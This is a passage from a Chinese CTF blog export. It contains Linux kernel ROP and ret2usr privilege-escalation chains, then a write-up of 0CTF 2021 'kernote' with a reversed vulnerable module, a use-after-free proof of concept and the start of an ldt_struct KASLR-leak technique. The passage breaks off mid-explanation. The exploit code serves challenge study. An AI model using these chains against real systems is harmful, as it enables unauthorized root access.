<li>gadget 1 调用 prepare_kernel_cred</li>
<li>gagdet 2 调用 commit_creds</li>
<li>gadget 3 切换用户态</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    rop[i] = canary;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> offset = vmlinux_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset;</span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = prepare_kernel_cred;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff81021e53</span> + offset;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset;</span><br><span class="line">rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line">rop[i++] = <span class="number">0xffffffff81a012da</span> + offset;</span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset;</span><br><span class="line"></span><br><span class="line">rop[i++] = (<span class="type">size_t</span>)shell;</span><br><span class="line">rop[i++] = user_cs;</span><br><span class="line">rop[i++] = user_rflags;</span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="ret2usr"><a href="#ret2usr" class="headerlink" title="ret2usr"></a>ret2usr</h3><p>ret2usr 的方法利用用户空间的进程不能访问内核空间，但内核空间能访问用户空间特性使得内核代码或者数据流向用户空间，以 ring 0 特权执行用户空间代码完成提权</p>
<p>与 ROP 的不同：</p>
<ol>
<li><p>ROP 通过内核 ROP 链执行提权，返回用户态后执行 system，获取shell</p>
</li>
<li><p>ret2usr 直接返回到用户空间构造的函数指针来实现提权</p>
</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">getroot</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>* (*pkc)(<span class="type">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">void</span>  (*cc)(<span class="type">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] root now&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ROP chain</span></span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> offset = vmlinux_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)getroot;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset;</span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset;</span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)shell;</span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>0CTF 2021 kernote</title>
    <url>/2022/05/06/0CTF-2021-kernote/</url>
    <content><![CDATA[<span id="more"></span>

<h3 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HOST OS Platform: macOS</span><br><span class="line">HOST OS Version: 10.15</span><br><span class="line">虚拟机软件：VMware Fusion 12</span><br><span class="line">OS Platform:  Linux Ubuntu</span><br><span class="line">OS Version: 18.04</span><br></pre></td></tr></table></figure>
<p>题目资源获取链接：<a href="https://github.com/Darenfy/CTF-Chanllenge/tree/main/0CTF-2021-final/kernote">https://github.com/Darenfy/CTF-Chanllenge/tree/main/0CTF-2021-final/kernote</a></p>
<h2 id="分析题目"><a href="#分析题目" class="headerlink" title="分析题目"></a>分析题目</h2><p>获取题目解压后，查看文件信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">bzImage  readme.md  rootfs.img  run.sh</span><br><span class="line"></span><br><span class="line">$ file *</span><br><span class="line">bzImage:    Linux kernel x86 boot executable bzImage, version 5.11.9 (yzloser@yzloser-rubbish) <span class="comment">#2 SMP Wed Sep 22 23:03:52 CST 2021, RO-rootFS, swap_dev 0x9, Normal VGA</span></span><br><span class="line">readme.md:  ASCII text</span><br><span class="line">rootfs.img: Linux rev 1.0 ext4 filesystem data, UUID=1a11479a-9bca-4c78-ae24-9c9c0b41d9f4 (extents) (64bit) (large files) (huge files)</span><br><span class="line">run.sh:     POSIX shell script, ASCII text executable</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cat</span> readme.md </span><br><span class="line">Here are some kernel config options <span class="keyword">in</span> <span class="keyword">case</span> you need it</span><br><span class="line">CONFIG_SLAB=y</span><br><span class="line">CONFIG_SLAB_FREELIST_RANDOM=y</span><br><span class="line">CONFIG_SLAB_FREELIST_HARDENED=y</span><br><span class="line">CONFIG_HARDENED_USERCOPY=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER_PATH=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cat</span> run.sh </span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-hda ./rootfs.img \</span><br><span class="line">-append <span class="string">&quot;console=ttyS0 quiet root=/dev/sda rw init=/init oops=panic panic=1 panic_on_warn=1 kaslr pti=on&quot;</span> \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-smp cores=2,threads=2 \</span><br><span class="line">-nographic \</span><br><span class="line">-cpu kvm64,+smep,+smap \</span><br><span class="line">-no-reboot \</span><br><span class="line">-snapshot</span><br></pre></td></tr></table></figure>
<p>首先共包括四个文件</p>
<ul>
<li>bzImage：典型的kernel镜像文件</li>
<li>rootfs.img：ext4 文件系统</li>
<li>readme.md：提示内核配置信息</li>
<li>run.sh：QEMU 运行脚本</li>
</ul>
<p>根据上述信息可以看到</p>
<ul>
<li>常用内核防护均已开启（KASLR，SMEP，SMAP，KPTI）</li>
<li>使用 SLAB allocator</li>
<li>通过硬编码关闭 Usermode Helper</li>
<li>如果触发 kernel warnings 或 panic 虚拟机会直接关闭</li>
</ul>
<h2 id="查看文件系统"><a href="#查看文件系统" class="headerlink" title="查看文件系统"></a>查看文件系统</h2><p><code>rootfs.img</code> 是 ext4 文件系统，在 Ubuntu 上可以直接挂载</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">mkdir</span> mount</span><br><span class="line">$ sudo mount -o loop rootfs.img mount</span><br><span class="line">/mount$ <span class="built_in">ls</span></span><br><span class="line">bin  dev  etc  flag  init  kernote.ko  linuxrc  lost+found  proc  sbin  sys  tmp  usr</span><br><span class="line"></span><br><span class="line">embeded@ubuntu:~/Desktop/release/mount$ <span class="built_in">cat</span> init </span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t tmpfs tmpfs /tmp</span><br><span class="line"><span class="comment">#mount -t devtmpfs devtmpfs /dev</span></span><br><span class="line"><span class="built_in">mkdir</span> /dev/pts</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br><span class="line"><span class="built_in">echo</span> /sbin/mdev&gt;/proc/sys/kernel/hotplug</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;flag&#123;testflag&#125;&quot;</span>&gt;/flag</span><br><span class="line"><span class="built_in">chmod</span> 660 /flag</span><br><span class="line">insmod /kernote.ko</span><br><span class="line"><span class="comment">#/sbin/mdev -s</span></span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/kernote</span><br><span class="line"><span class="built_in">chmod</span> 777 /tmp</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>
<p>主要有以下几点：</p>
<ul>
<li><code>dmesg_restrict=1</code> 意味着无法读取内核日志</li>
<li><code>kptr_restrict=1</code> 意味着无法从 <code>/proc/kallsyms</code> 读取内核地址<br>🌰<img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205061550746.png"></li>
</ul>
<h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>接下来我们将对带有漏洞代码的 kernel 模块进行逆向</p>
<p><strong>init and exit</strong><br>主要注册了一个字符设备，可以通过 <code>/dev/kernote</code> 访问</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">kernel_module_init</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">// 注册字符设备</span></span><br><span class="line">    <span class="type">int</span> result</span><br><span class="line"></span><br><span class="line">    major_num = __register_chrdev(<span class="number">0</span>, <span class="number">0</span>, <span class="number">256</span>, <span class="string">&quot;kernote&quot;</span>, kernote_fo)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> major_num &gt;= <span class="number">0</span> <span class="comment">// 如果分配成功</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 创建结构类指针</span></span><br><span class="line">        module_class = _class_create(this_module, <span class="string">&quot;kernote&quot;</span>, module_device);</span><br><span class="line">        <span class="keyword">if</span> <span class="title function_">IS_ERR</span><span class="params">(module_class)</span></span><br><span class="line">        &#123;</span><br><span class="line">            module_device = device_create(module_class, <span class="number">0</span>, (major_num&lt;&lt;<span class="number">20</span>), <span class="number">0</span>, <span class="string">&quot;kernote&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> IS_ERR(module_device)</span><br><span class="line">            &#123;</span><br><span class="line">                print(<span class="string">&quot;Insert module complete&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                class_destroy(module_class)</span><br><span class="line">                _unregister_chrdev(major_num, <span class="number">0</span>, <span class="number">256</span>, <span class="string">&quot;kernote&quot;</span>)</span><br><span class="line">                print(<span class="string">&quot;Failed to create device&quot;</span>)</span><br><span class="line">                result = module_device</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            _unregister_chrdev(major_num, <span class="number">0</span>, <span class="number">256</span>, <span class="string">&quot;kernote&quot;</span>)</span><br><span class="line">            print(<span class="string">&quot;Failed to create class&quot;</span>)</span><br><span class="line">            result =  module_class</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        print(Failed to <span class="keyword">register</span> device)</span><br><span class="line">        result = major_num</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> kernel_module_exit()</span><br><span class="line">&#123;</span><br><span class="line">    print(<span class="string">&quot;Start to clean up the module&quot;</span>)</span><br><span class="line">    device_destroy(module_class, (major_num) &lt;&lt; <span class="number">20</span>)</span><br><span class="line">    class_destory(module_class)</span><br><span class="line">    _unregister_chrdev(major_num, <span class="number">0</span>, <span class="number">256</span>, <span class="string">&quot;kernote&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;Module clean up complete&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>ioctl</strong><br>该模块主要创建一个大小为 16 的 buf 指针数组来进行笔记的管理，每一个指针对应一个笔记，ioctl 主要对笔记的管理进行的描述</p>
<ul>
<li>0x6668<br>  删除笔记，如果释放笔记索引不超过16且该笔记已被创建，则调用 kfree 对其进行释放，并且清除笔记内容</li>
<li>0x6666<br>  获取笔记，如果笔记索引不超过16，则获取笔记指针</li>
<li>0x6667<br>  创建笔记，如果笔记索引不超过16，则调用 kmalloc 创建 8 字节内容，分配给指针数组</li>
<li>0x6669<br>  写笔记，如果笔记指针存在，则将笔记内容写入内存</li>
<li>0x666a<br>  展示笔记，只有 root 用户才能查看笔记内容<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> major_num;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="keyword">class</span> *<span class="title">module_class</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">module_device</span>;</span></span><br><span class="line"><span class="type">spinlock_t</span> spin;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">kernote_ioctl</span><span class="params">(<span class="keyword">struct</span> file *f , uint cmd, uint args)</span></span><br><span class="line">&#123;</span><br><span class="line">    raw_spin_lock(&amp;spin)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(cmd)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x6668</span>: <span class="comment">// delete</span></span><br><span class="line">            <span class="keyword">if</span> arg &gt; <span class="number">15</span> || <span class="literal">NULL</span> = buf[arg]:</span><br><span class="line">                ret = <span class="number">-1</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            </span><br><span class="line">            kfree(buf[arg])</span><br><span class="line">            buf[arg] = <span class="number">0</span>;</span><br><span class="line">            ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x6666</span>: <span class="comment">// fetch</span></span><br><span class="line">            ret = <span class="number">-1</span></span><br><span class="line">            <span class="keyword">if</span> arg &gt; <span class="number">15</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            note = buf[arg]</span><br><span class="line">            ret = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x6667</span>: <span class="comment">// alloc</span></span><br><span class="line">            <span class="keyword">if</span> arg &gt; <span class="number">15</span>:</span><br><span class="line">                ret = <span class="number">-1</span></span><br><span class="line">            </span><br><span class="line">            uint64 *newnote = kmalloc(<span class="number">8</span>, GFP_KERNEL)</span><br><span class="line">            buf[arg] = newnote</span><br><span class="line">            ret = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x6669</span>: <span class="comment">// write</span></span><br><span class="line">            <span class="keyword">if</span> (note) &#123;</span><br><span class="line">                *note = arg</span><br><span class="line">                ret = <span class="number">0</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ret = <span class="number">-1</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x666A</span>: <span class="comment">// inc_refcount? 打印信息</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span> =</span> current_task-&gt;cred-&gt;user</span><br><span class="line">            <span class="title function_">refcount_inc</span><span class="params">(&amp;user-&gt;__count)</span></span><br><span class="line">            <span class="title function_">if</span> <span class="params">(user-&gt;uid != <span class="number">0</span>)</span></span><br><span class="line">                <span class="title function_">print</span><span class="params">(<span class="string">&quot;******&quot;</span>)</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> note != <span class="literal">NULL</span></span><br><span class="line">                <span class="title function_">print</span><span class="params">(<span class="string">&quot;0x%lx&quot;</span>, *note)</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="title function_">print</span><span class="params">(<span class="string">&quot;No note&quot;</span>)</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">spin_unlock</span><span class="params">(&amp;spin)</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="漏洞分析及构建"><a href="#漏洞分析及构建" class="headerlink" title="漏洞分析及构建"></a>漏洞分析及构建</h2></li>
</ul>
<p><strong>漏洞成因</strong><br>首先创建笔记并将指针存入 buf，这时应当注意内核使用 SLAB 分配器<br>源码如下，可以看到 kmalloc 的最小分配尺寸是 100000（比特位）即 32 字节，因此虽然代码中要求创建 8 字节内存空间，但是在内核中分配了32 字节</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_SHIFT_LOW	5</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> KMALLOC_MIN_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_MIN_SIZE (1 &lt;&lt; KMALLOC_SHIFT_LOW)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>然后获取笔记，这会使笔记指针存入 note 变量，<br>随后对笔记进行删除，会笔记对应的内存释放，并把 buf 指针数组的内容清零，但是目前 note 变量里仍旧存放着内存指针<br>最后写笔记，通过 note 变量仍然可以对已释放内存进行写操作，从而构成 use-after-free</p>
<p><strong>poc</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SET_NOTE 0x6666</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALLOC_ENTRY 0x6667</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FREE_ENTRY 0x6668</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WRITE_NOTE 0x6669</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> kfd;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">set_note</span><span class="params">(<span class="type">uint64_t</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> ioctl(kfd, SET_NOTE, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">alloc_entry</span><span class="params">(<span class="type">uint64_t</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> ioctl(kfd, ALLOC_ENTRY, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">free_entry</span><span class="params">(<span class="type">uint64_t</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> ioctl(kfd, FREE_ENTRY, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">write_note</span><span class="params">(<span class="type">uint64_t</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> ioctl(kfd, WRITE_NOTE, val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    kfd = open(<span class="string">&quot;/dev/kernote&quot;</span>, O_RDWR);</span><br><span class="line">    alloc_entry(<span class="number">1</span>);</span><br><span class="line">    set_note(<span class="number">1</span>);</span><br><span class="line">    free_entry(<span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">    write_note(<span class="number">0x4141414141414141</span>);</span><br><span class="line">    show_note();</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">32</span>] = &#123;&#125;;</span><br><span class="line">    read(fd, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>利用构建</strong></p>
<p>之前提供的信息有：</p>
<ul>
<li>KASLR，SMEP，SMAP，KPTI</li>
<li>SLAB allocator</li>
<li>通过硬编码关闭 Usermode Helper</li>
<li>如果触发 kernel warnings 或 panic 虚拟机会直接关闭</li>
</ul>
<p>最终的目的是控制 cred struct 修改权限，或者调用 commit_creds(preparekernel_cred(0))</p>
<ul>
<li>KASLR ：内核加载地址不定，需要通过 object 泄露内核基址</li>
</ul>
<p>这里选择的是 <code>ldt_struct</code>，大小为 0x10，在 kmalloc-32 内，<br>简单了解一下，ldt 类似于 gdt，主要用于保存访问内存的段描述符</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ldt_structs can be allocated, used, and freed, but they are never</span></span><br><span class="line"><span class="comment"> * modified while live.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span>	*<span class="title">entries</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		nr_entries;</span><br><span class="line">	<span class="type">int</span>			slot;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>ldt_struct</code> 的前八个字节是一个我们能控制的指针<br>而如何对 <code>ldt_struct</code> 进行操作，则可以通过 <code>SYS_modify_ldt</code> 系统调用来实现</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">SYSCALL_DEFINE3(modify_ldt, <span class="type">int</span> , func , <span class="type">void</span> __user * , ptr ,</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">long</span> , bytecount)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> ret = -ENOSYS;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (func) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">		ret = read_ldt(ptr, bytecount);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">		ret = write_ldt(ptr, bytecount, <span class="number">1</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">		ret = read_default_ldt(ptr, bytecount);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">		ret = write_ldt(ptr, bytecount, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以看到我们可以通过如下方式对 ldt 进行读写操作</span></span><br><span class="line">syscall(SYS_modify_ldt, <span class="number">0</span>, buf, len);</span><br><span class="line">syscall(SYS_modify_ldt, <span class="number">1</span>, buf, len);</span><br></pre></td></tr></table></figure>
<p>查看 <code>read_ldt</code> 能干些什么，可以看到对 size 进行简单的大小判断后直接将进程的 ldt-&gt;entries 拷贝到用户空间地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">read_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> entries_size;</span><br><span class="line">    ...</span><br><span class="line">    entries_size = mm-&gt;context.ldt-&gt;nr_entries * LDT_ENTRY_SIZE;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size))</span><br><span class="line"></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>查看 <code>write_ldt</code> 能干些什么，简单来说就是将 用户空间构造的 <code>user_desc</code> 转换后对原进程的 <code>ldt_struct</code> 进行替换，期间会调用 <code>alloc_ldt_struct</code> 创建 <code>ldt_struct</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">write_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount, <span class="type">int</span> oldmode)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>, *<span class="title">old_ldt</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> old_nr_entries, new_nr_entries;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">ldt_info</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> <span class="title">ldt</span>;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (bytecount != <span class="keyword">sizeof</span>(ldt_info))</span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(&amp;ldt_info, ptr, <span class="keyword">sizeof</span>(ldt_info)))</span><br><span class="line"></span><br><span class="line">    old_ldt       = mm-&gt;context.ldt;</span><br><span class="line">    old_nr_entries = old_ldt ? old_ldt-&gt;nr_entries : <span class="number">0</span>;</span><br><span class="line">    new_nr_entries = max(ldt_info.entry_number + <span class="number">1</span>, old_nr_entries);</span><br><span class="line"></span><br><span class="line">    new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line">    <span class="keyword">if</span> (old_ldt)</span><br><span class="line">		<span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">    new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br><span class="line"></span><br><span class="line">    install_ldt(mm, new_ldt);</span><br><span class="line">    unmap_ldt_struct(mm, old_ldt);</span><br><span class="line">    free_ldt_struct(old_ldt);</span><br><span class="line">    error = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> error;</span><br></pre></td></tr></table></figure>
<p>因此可以采用如下方式形成任意读：</p>
<ol>
<li>分配并释放笔记后，使用 <code>write_ldt</code> 对笔记内存进行占用</li>
<li>使用 UAF 对 ldt entry 指针进行覆盖</li>
<li>使用 <code>read_ldt</code> 对 ldt 地址进行读取操作</li>
</ol>
<p>需要注意的是：copy_to_user 在访问错误地址时不会触发 kernel panic</p>
<p>内核的一般加载地址为：0xffffffff81000000</p>
<p>所以可以尝试通过从 0xffffffff80000000 处开始搜索，步长为 200000</p>
